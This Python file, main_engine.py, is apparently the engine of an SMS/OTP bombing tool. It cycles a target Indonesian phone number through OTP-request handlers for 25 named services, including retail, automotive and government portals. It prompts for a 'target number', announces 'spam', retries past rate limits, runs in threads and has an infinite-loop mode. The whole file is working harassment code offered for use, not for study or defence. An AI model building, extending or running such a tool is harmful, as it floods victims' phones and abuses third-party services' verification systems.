#!/usr/bin/env python3
# main_engine.py - FIXED VERSION
# Retry, delay, rotate UA, error handling

import time
import random
import threading
from colorama import Fore, Style

from handlers_plain import *
from utils import get_random_user_agent, fmt_08, fmt_nocode, fmt_plus

MAX_RETRIES = 2
RETRY_DELAY = 2
BETWEEN_API_DELAY = 0.5

HANDLERS = [
    ("HRS-BRE", send_hrsbre_otp, "08"),
    ("Erafone", send_erafone_otp, "08"),
    ("PlanetBan", send_planetban_otp, "08"),
    ("TuneUp", send_tuneup_otp, "08"),
    ("HashMicro", send_hashmicro_otp, "62"),
    ("Klook", send_klook_otp, "62"),
    ("InternetRakyat", send_internetrakyat_otp, "08"),
    ("Ultramilk", send_ultramilk_register, "08"),
    ("Kaniva", send_kaniva_otp, "08"),
    ("Jembatani", send_jembatani_otp, "62"),
    ("RCX", send_rcx_otp, "62"),
    ("SahabatTeknisi", send_sahabatteknisi_otp, "62"),
    ("Auto2000", send_auto2000_otp, "08"),
    ("AstraDaihatsu", send_astra_daihatsu_otp, "62"),
    ("RoyalCanin", send_royal_canin_otp, "62"),
    ("Watsons", send_watsons_otp, "62"),
    ("99.co", send_99co_otp, "62"),
    ("BeliRumah", send_belirumah_otp, "62"),
    ("Fastwork", send_fastwork_otp, "08"),
    ("Beautyhaul", send_beautyhaul_otp, "62"),
    ("Hainaya", send_hainaya_otp, "62"),
    ("MinumYukKaka", send_minumyukkaka_otp, "08"),
    ("Sidemang", send_sidemang_otp, "08"),
    ("LaporMasBup", send_lapormasbup_otp, "08"),
    ("PTSP Kemenag", send_ptsp_kemenag_otp, "08"),
]

def parse_response(resp):
    if resp is None:
        return "FAIL", "No response"
    if isinstance(resp, tuple):
        resp = resp[0]
        if resp is None:
            return "FAIL", "No response"
    if isinstance(resp, dict):
        return "FAIL", "Payload only, not sent"
    try:
        status = resp.status_code if hasattr(resp, 'status_code') else 0
        text = resp.text[:150] if hasattr(resp, 'text') else str(resp)[:150]
        text_lower = text.lower()
        if status in [200, 201, 202]:
            if any(kw in text_lower for kw in ['captcha', 'verifikasi', 'robot', 'bot', 'recaptcha']):
                return "CAPTCHA", "Captcha required"
            if any(kw in text_lower for kw in ['otp', 'success', 'berhasil', 'sent', 'terkirim', 'sukses']):
                return "SUCCESS", "OTP sent"
            return "SUCCESS", "OTP sent"
        elif status == 400:
            return "FAIL", text[:80] or "Bad request"
        elif status == 401:
            return "FAIL", "Unauthorized"
        elif status == 403:
            return "BLOCKED", "Forbidden"
        elif status == 404:
            return "FAIL", "Not found"
        elif status == 412:
            return "CAPTCHA", "Captcha required"
        elif status == 419:
            return "FAIL", "CSRF expired"
        elif status == 422:
            return "LIMITED", "Rate limit"
        elif status == 429:
            return "LIMITED", "Too many requests"
        elif status == 500:
            return "ERROR", "Server error"
        elif status == 503:
            return "FAIL", "Service unavailable"
        else:
            return "FAIL", f"HTTP {status}"
    except Exception as e:
        return "ERROR", str(e)[:80]

def attack_api(name, handler, phone, delay_format):
    for attempt in range(MAX_RETRIES):
        try:
            if delay_format == "08":
                phone_formatted = fmt_08(phone)
            elif delay_format == "62":
                phone_formatted = fmt_plus(phone)
            else:
                phone_formatted = phone
            resp = handler(phone_formatted)
            status, msg = parse_response(resp)
            if status == "SUCCESS":
                return status, msg
            elif status == "LIMITED":
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            elif status == "CAPTCHA":
                return status, msg
            else:
                if attempt < MAX_RETRIES - 1:
                    time.sleep(RETRY_DELAY)
                    continue
                return status, msg
        except Exception as e:
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY)
                continue
            return "ERROR", str(e)[:80]
    return "FAIL", "All retries failed"

def run_single_round(threads=1, target=None):
    if target is None:
        target = input(Fore.YELLOW + "? Nomor target (08xx / +62xx): " + Style.RESET_ALL).strip()
    print(f"\n{Fore.CYAN}[*] Menjalankan Single Round dengan {threads} thread...{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Memulai spam menggunakan {len(HANDLERS)} API{Style.RESET_ALL}\n")
    results = {"SUCCESS": 0, "FAIL": 0, "BLOCKED": 0, "LIMITED": 0, "CAPTCHA": 0, "ERROR": 0}
    def worker(handler_data, idx, total):
        name, handler, delay_format = handler_data
        status, msg = attack_api(name, handler, target, delay_format)
        results[status] = results.get(status, 0) + 1
        if status == "SUCCESS":
            color = Fore.GREEN; icon = "[+]"
        elif status == "LIMITED":
            color = Fore.YELLOW; icon = "[!]"
        elif status in ["BLOCKED", "CAPTCHA"]:
            color = Fore.RED; icon = "[!]"
        else:
            color = Fore.RED; icon = "[-]"
        print(f"{color}{icon} ({idx}/{total}) {name}: {status} - {msg}{Style.RESET_ALL}")
        time.sleep(BETWEEN_API_DELAY)
    total = len(HANDLERS)
    thread_list = []
    for idx, h in enumerate(HANDLERS, 1):
        t = threading.Thread(target=worker, args=(h, idx, total))
        t.daemon = True
        t.start()
        thread_list.append(t)
        if len(thread_list) >= threads:
            for t2 in thread_list:
                t2.join(timeout=30)
            thread_list = []
    for t in thread_list:
        t.join(timeout=30)
    print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}SUCCESS: {results['SUCCESS']}{Style.RESET_ALL}")
    print(f"{Fore.RED}FAIL: {results['FAIL']}{Style.RESET_ALL}")
    print(f"{Fore.RED}BLOCKED: {results['BLOCKED']}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}LIMITED: {results['LIMITED']}{Style.RESET_ALL}")
    print(f"{Fore.RED}CAPTCHA: {results['CAPTCHA']}{Style.RESET_ALL}")
    print(f"{Fore.RED}ERROR: {results['ERROR']}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}Selamat, Sukses: {results['SUCCESS']}/{total}{Style.RESET_ALL}")

def run_infinite_loop(target=None):
    if target is None:
        target = input(Fore.YELLOW + "? Nomor target: " + Style.RESET_ALL).strip()
    round_num = 0
    print(f"{Fore.CYAN}[*] Infinite Loop. CTRL+C untuk stop.{Style.RESET_ALL}\n")
    try:
        while True:
            round_num += 1
            print(f"\n{Fore.CYAN}===== ROUND {round_num} ====={Style.RESET_ALL}")
            run_single_round(threads=1, target=target)
            time.sleep(5)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Stopped{Style.RESET_ALL}")
